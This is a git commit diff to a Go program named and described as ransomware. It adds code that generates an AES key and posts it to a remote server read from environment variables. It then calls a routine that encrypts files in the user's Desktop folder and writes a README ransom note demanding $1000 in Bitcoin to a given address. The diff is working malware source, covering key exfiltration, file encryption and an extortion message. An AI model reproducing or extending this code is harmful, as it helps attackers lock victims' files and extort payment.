ead29ca8f1dc0534af5a40f706f7857bae7c485a
Alcides <guus@nawijn.eu>
2024-05-19 21:41:54 +0200

    Created a webserver to handle key requests, keys are still created locally

--- cmd/ransomware/main.go
+++ cmd/ransomware/main.go
@@ -8,12 +8,18 @@
 package main
 
 import (
+	"crypto/rand"
+	"encoding/json"
 	"fmt"
+	"log"
+	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"runtime"
 
 	"github.com/common-nighthawk/go-figure"
+	"github.com/joho/godotenv"
 	"ransomware.com/main/internal/colors"
 	"ransomware.com/main/internal/ransomware"
 )
@@ -34,9 +40,42 @@ func main() {
 		fmt.Println("Windows is required to run this ransomware. Exiting...")
 		return
 	}
-	key := make([]byte, 32)
-	fmt.Println("Key: ", key)
-	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE")), key)
 
-	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "README.txt"), []byte("Your files have been encrypted. To decrypt them, send $1000 to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n"), 0644)
+	err := godotenv.Load()
+	if err != nil {
+		log.Fatal("Error loading .env file")
+	}
+
+	key := make([]byte, 32)
+	_, err = rand.Read(key)
+	if err != nil {
+		fmt.Println("Error generating AES key:", err)
+		return
+	}
+
+	values := url.Values{
+		"key": {string(key)},
+	}
+
+	ipaddr := os.Getenv("IP_ADDRESS")
+	port := os.Getenv("PORT")
+
+	resp, err := http.PostForm("http://"+ipaddr+":"+port+"/upload", values)
+
+	if err != nil {
+		fmt.Println("Error sending key to server: " + ipaddr + ":" + port + "\n")
+		return
+	}
+
+	defer resp.Body.Close()
+
+	var res map[string]interface{}
+
+	json.NewDecoder(resp.Body).Decode(&res)
+
+	fmt.Println(res["form"])
+
+	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
+
+	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//README.txt"), []byte("Your files have been encrypted. To decrypt them, send $1000 to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n"), 0644)
 }
